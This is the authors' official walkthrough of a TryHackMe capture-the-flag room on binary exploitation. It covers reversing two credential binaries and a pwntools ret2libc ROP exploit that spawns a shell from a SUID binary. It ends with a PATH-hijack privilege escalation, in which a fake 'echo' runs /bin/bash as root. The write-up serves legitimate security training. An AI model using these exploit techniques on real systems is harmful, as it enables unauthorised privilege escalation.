---
author: swanandx, Lammm
title: "Binary Heaven Walk-through"
date: 2021-05-12
description: Official walkthrough for binary heaven room on THM.
tags: ["THM"]
ShowBreadCrumbs: true
---


# THM - Official Binary Heaven Walk-through

This is a THM room created by swanandx and Lammm that touches on exploiting binary. This is our first time creating a room and we hope you will enjoy it. 

Link to room: https://tryhackme.com/room/binaryheaven

## Task 1 - Deploy the machine
Like what the task suggested, deploy the VM and move on to Task 2.

## Task 2 - Being worthy
Upon downloading the task file, we get a zip file `credentials.zip`. Unzip it and we see 2 files, `angel_A` and `angel_B`, let's check them out. Running `file` command on both file suggest that they are executable. After some blind testing, we can conclude that if ran successfully, `angel_A` and `angel_B` should return `username` and `password`, respectively. 

Next step, analyze the binaries and figuring out the credentials.We can analyze the binaries using either `radare2`(CLI tool) or `ghidra`(GUI application).

### angel_A

Start analyzing the binary by running `r2 -d -A angel_A`. Next, we run `afl` to list all the functions. Then, if we were to disassemble a certain function, we could run `pdf @<function_name>`, `pdf @sym.main` in our case.

![](./images/r2.png#center)

As you can see in screen shot, it xor every character of our input with 4, and then adds 8 to it. Finally compares it with "kym\~humr". OR we can look at that address and get the hex values for it.

![](./images/r2_value.png#center)

write a script to first subtract 8 from it and then xor against 4.

```python
hex_values = [] #list of the values we got using r2 or ghidra

username = ""
for char in hex_values:
	username += chr((char - 8) ^ 4)
print(username)

```


### angel_B
Likewise, start analyzing the binary with `r2 -d -A angel_B`. You might notice that r2 takes forever when it comes to analyzing this binary, reason being is that this is not a binary written in a "usual" language; it's written in Golang. `pdf @sym.main.main` to disassemble the main function. 

![](./images/unknown.png#center)

If you looked carefully at the function, you would notice that the password is displayed in plain sight, followed by a bunch of gibberish. Supply the password to the binary and we were told `Now GO ahead and SSH into heaven`. 

Upon SSH into the VM with the credentials we got from earlier, we land at user `guardian`. Inspect the home directory and grab the `guardian_flag.txt`.

## Task 3 - Return to the origins
 There is another binary file named `pwn_me` and it has SUID bit set for  user `binexgod`. Therefore, a logical assumption at this point would be, exploiting this binary should escalate us to user `binexgod`.  

It leaks the address of system, so we can bypass ASLR. Now, we have to find the offset for rip.
we can use pwntools cyclic for creating it. Run `cyclic <length>`

Put the pattern in temporary file, open the binary in gdb and run it with supplying that pattern. This will cause segfault. Take the value it gave and use `cyclic -l value` to find the offset

![](./images/unknown.png.2#center)

Now we can automate the remaining ROP chain using pwntools.

```python
from pwn import *

elf = context.binary = ELF('./pwn_me')
libc = elf.libc
p = process()

#get the leaked address
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

#set our libc address according to the leaked address
libc.address = system_leak - libc.sym['system']
log.success('LIBC base: {}'.format(hex(libc.address)))

#get location of binsh from libc
binsh = next(libc.search(b'/bin/sh'))

#build the rop chain
rop = ROP(libc)
rop.raw('A' * 32)
rop.system(binsh)

#send our rop chain
p.sendline(rop.chain())

#Get the shell
p.interactive()
```

![](./images/unknown.png.3#center)


After successfully escalating from guardian to `binexgod`, we can go ahead and grab the `binexgod_flag.txt`.

## Task 4 - PATH to root
The only thing left for us to do is to privesc to root. We were given a `vuln` binary alongside its source code `vuln.c`, let's check them out.

By running the `vuln` binary, we get the output *Get out of heaven lol*. Let us examine the source code and see what's happening under the hood then.

We can see that on line 17, the code is running the `echo` command specifically from the env variable. Which means this binary is potentially affected by `environment variable manipulation` attack. Let's give this a try.

![](./images/unknown.png.4#center)

First, cd into /tmp directory and create a file called `echo.c` which contains the following code.

```c
#include<stdio.h>
#include<stdlib.h>

int main()
{
  system("/bin/bash");
}
```

Nothing fancy here, just a C program that upon execute, will give us a bash shell. We then compile this C program by running `gcc -o echo echo.c`. Note that the output binary must be named `echo` because we are trying to replace the "legit echo" binary.

Final step, export the `/tmp` directory to `PATH environment variable` by running `export PATH=/tmp:$PATH`. Note that the `/tmp` directory is placed before everything else, which means if 2 binaries with the same name exist on multiple directories, the system will execute the one mentioned first in the `PATH environment variable`, in our case, is the `/tmp` directory.

After completing all the steps above, we run the `vuln` binary again and we would get root shell successfully!

## Task 5 - Credit
Once again, we really thank you for spending time going through the room. We hope you learn something new.

- swanandx#8944, [Twitter](https://twitter.com/_swanandx), [THM](https://tryhackme.com/p/swanandx)
- Lammm#7495, [Twitter](https://twitter.com/Lammm_99), [THM](https://tryhackme.com/p/lammm)